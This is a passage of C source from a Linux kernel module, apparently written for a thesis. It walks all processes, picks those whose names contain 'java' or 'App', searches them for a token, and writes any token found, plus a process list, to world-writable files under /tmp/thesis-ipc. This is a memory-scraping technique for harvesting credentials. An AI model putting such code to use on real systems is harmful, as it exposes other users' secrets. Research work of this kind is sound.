    token_found = 0;

    rcu_read_lock();
    for_each_process(task) {
        char comm[TASK_COMM_LEN];
        get_task_comm(comm, task);
        if (strstr(comm, "java") || strstr(comm, "App")) {
            pr_info("kmod: scanning %s (pid=%d)\n", comm, task->pid);
            rcu_read_unlock();
            search_task(task);
            rcu_read_lock();
            if (token_found)
                break;
        }
    }
    rcu_read_unlock();

    if (token_found) {
        pos = 0;
        f = filp_open("/tmp/thesis-ipc/kmod_token", O_WRONLY|O_CREAT|O_TRUNC, 0666);
        if (!IS_ERR(f)) {
            kernel_write(f, found_token, strlen(found_token), &pos);
            filp_close(f, NULL);
        }
    }

    /* Also write process list */
    pos = 0;
    f = filp_open("/tmp/thesis-ipc/kmod_procs", O_WRONLY|O_CREAT|O_TRUNC, 0666);
    if (!IS_ERR(f)) {
